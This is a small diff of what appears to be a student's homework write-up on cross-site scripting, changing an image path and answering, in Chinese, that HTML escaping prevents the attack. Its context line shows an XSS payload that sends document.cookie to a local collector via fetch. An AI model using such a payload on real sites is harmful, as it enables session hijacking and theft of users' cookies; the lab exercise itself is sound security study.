@@ -291,7 +291,7 @@ fetch("http://127.0.0.1:8000/log?cookie="+document.cookie)
 </body>
 </html>
 ```
-![task5-2](week8/task5/task5-2.png)
+![task5-2](week8/Task5/task5-2.png)
 
 Q5-3: Based on the scenario you did in the previous step, how could it be prevented? <br>
 A5-3:利用HTML Escape (又稱為跳脫字元，意即將具有特殊語義的字符(如<、>、&)轉換成其對應的轉義字元(如 &lt;、&gt;、&amp;)) 把內容轉換成純文字，而不是程式碼。如下範例
